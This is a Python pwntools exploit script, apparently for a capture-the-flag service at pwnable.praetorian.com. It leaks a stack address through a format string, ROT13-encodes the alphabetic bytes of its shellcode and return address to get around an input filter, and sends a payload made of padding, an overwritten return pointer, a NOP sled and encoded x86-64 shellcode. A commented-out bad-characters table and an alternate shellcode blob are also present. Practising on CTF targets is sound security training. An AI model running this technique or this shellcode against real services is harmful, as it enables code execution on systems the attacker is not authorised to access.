#!/usr/bin/env python3
from pwn import *
import socket
import telnetlib
import struct
import string
import binascii
from ast import literal_eval
import codecs

context(os='linux',arch='amd64')
#elf = ELF("reverse", checksec=False)

local = False
if local:
    r = elf.process()
else:
    host = "pwnable.praetorian.com"
    port = 2888

r = remote(host, port)

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

#badchars = b""
#badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
#badchars += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f" # issues
#badchars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#badchars += #b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f" # line good
#badchars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf" # line good
#badchars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf" # line good
#badchars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe" # line good

#SC = asm(shellcraft.cat('win.txt'))

#SC =  b""
#SC += b"\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48\x8d"
#SC += b"\x05\xef\xff\xff\xff\x48\xbb\x39\x14\x18\xca\x4f"
#SC += b"\xea\x68\x52\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
#SC += b"\xff\xe2\xf4\x71\xac\x37\xa8\x26\x84\x47\x21\x51"
#SC += b"\x14\x81\x9a\x1b\xb5\x3a\x34\x51\x39\x7b\x9e\x11"
#SC += b"\xb8\x80\x4e\x39\x14\x18\xe5\x3a\x99\x1a\x7d\x5b"
#SC += b"\x7d\x76\xe5\x3b\x85\x1d\x31\x51\x34\x37\xbe\x22"
#SC += b"\x9a\x47\x25\x50\x7a\x36\xbe\x37\x9e\x68\x04\x6e"
#SC += b"\x40\x46\xa0\x74\xb2\x67\x57"

SC =  b""
SC += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
SC += b"\x05\xef\xff\xff\xff\x48\xbb\x03\x87\xa1\x1f\x1a"
SC += b"\xa8\x41\x9c\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
SC += b"\xff\xe2\xf4\x69\xae\xf9\x86\x70\xaa\x1e\xf6\x02"
SC += b"\xd9\xae\x1a\x52\x3f\x09\x25\x01\x87\xb0\x43\xbb"
SC += b"\x8b\xa5\x3d\x52\xcf\x28\xf9\x70\xb8\x1b\xf6\x29"
SC += b"\xdf\xae\x1a\x70\xab\x1f\xd4\xfc\x49\xcb\x3e\x42"
SC += b"\xa7\x44\xe9\xf5\xed\x9a\x47\x83\xe0\xfa\xb3\x61"
SC += b"\xee\xcf\x30\x69\xc0\x41\xcf\x4b\x0e\x46\x4d\x4d"
SC += b"\xe0\xc8\x7a\x0c\x82\xa1\x1f\x1a\xa8\x41\x9c"

updatedSC = b""
byteArray = bytearray(SC)
for item in byteArray:
    if chr(item) in allChars:
        #print(chr(item))
        #print(moved.hex())
        updatedSC += ord(codecs.encode(chr(item), "rot13")).to_bytes(1, byteorder='little')
    else:
        #print(item.to_bytes(1, byteorder='little'))
        updatedSC += item.to_bytes(1, byteorder='little')

nopSled = b"\x90" * 300#(220 - len(updatedSC) - 8)
padding = b"\x4e" * 24
#PAYLOAD = b"\x90" * (125) + updatedSC #+ b"\x4e" * 100
#print(len(SC))
#PAYLOAD = b"A" * 250
# format string
leak = "%llx "

# send the format string
r.sendline(leak)
# read the data
r.readuntil("remaining.\n")
txt = r.readuntil("\n")
clean = txt.decode("utf-8")
addrs = clean.split(" ")
print(addrs[0])
memory_address = int("0x" + addrs[0], 16) + 606
print(memory_address.to_bytes(8, byteorder='little'))

#pivot = b"\x08\xe2\xff\xff\xff\x7f\00\00"
pivot = memory_address.to_bytes(8, byteorder='little')
updatedPivot = b""
byteArray = bytearray(pivot)
for item in byteArray:
    if chr(item) in allChars:
        #print(chr(item))
        #print(moved.hex())
        updatedPivot += ord(codecs.encode(chr(item), "rot13")).to_bytes(1, byteorder='little')
    else:
        #print(item.to_bytes(1, byteorder='little'))
        updatedPivot += item.to_bytes(1, byteorder='little')

PAYLOAD = padding + updatedPivot + nopSled + updatedSC + b"\x4e" * 100
print(f"Total Payload Size: {len(PAYLOAD)}")
print(f"Shellcode Size: {len(updatedSC)}")
r.readuntil("\n")
time.sleep(1)
r.writeline(PAYLOAD)
